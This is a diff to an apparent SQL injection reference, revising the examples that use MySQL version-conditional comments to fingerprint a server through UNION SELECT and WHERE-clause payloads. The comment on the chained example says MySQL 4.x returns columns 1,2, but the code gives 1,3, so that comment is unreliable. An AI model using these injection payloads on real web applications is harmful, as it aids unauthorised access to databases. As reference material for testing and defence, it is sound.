@@ -41,11 +41,26 @@ SELECT /*!32302 1/0, */ 1 FROM dual
 Use version-specific comments to create payloads that work across different MySQL versions:
 
 ```sql
--- Returns different column counts based on MySQL version
-UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/
+-- Version-conditional column count: adapts UNION columns based on MySQL version
+-- MySQL >= 5.0.0: executes "1,2,3" (3 columns)
+-- MySQL < 5.0.0: the /*!50000 ... */ block is treated as a comment, returns "1" (1 column)
+UNION SELECT 1/*!50000,2,3*/
 
--- Version check that returns False if version >= 5.00.94
-1 /*!50094eaea*/;
+-- Chained version checks for multiple version thresholds
+-- MySQL >= 5.0.0: returns 3 columns (1,2,3)
+-- MySQL >= 4.0.0 but < 5.0.0: returns 2 columns (1,2)
+-- MySQL < 4.0.0: returns 1 column (1)
+UNION SELECT 1/*!50000,2*//*!40000,3*/
+```
+
+**Note on null bytes (`%00`):** In web injection contexts, URL-encoded null bytes may truncate strings at the application layer before reaching MySQL. This is application-dependent behavior, not MySQL syntax.
+
+```sql
+-- Version detection: different results based on MySQL version
+-- MySQL >= 5.0.94: comment content executes, WHERE becomes "1=0 OR 1=1" (TRUE)
+-- MySQL < 5.0.94: comment ignored, WHERE remains "1=0" (FALSE)
+SELECT 1 FROM dual WHERE 1=0 /*!50094 OR 1=1*/
+-- Result: MySQL >= 5.0.94 returns row; MySQL < 5.0.94 returns empty
 ```
 
 This technique allows a single payload to adapt to different MySQL versions, useful when the exact version is unknown.
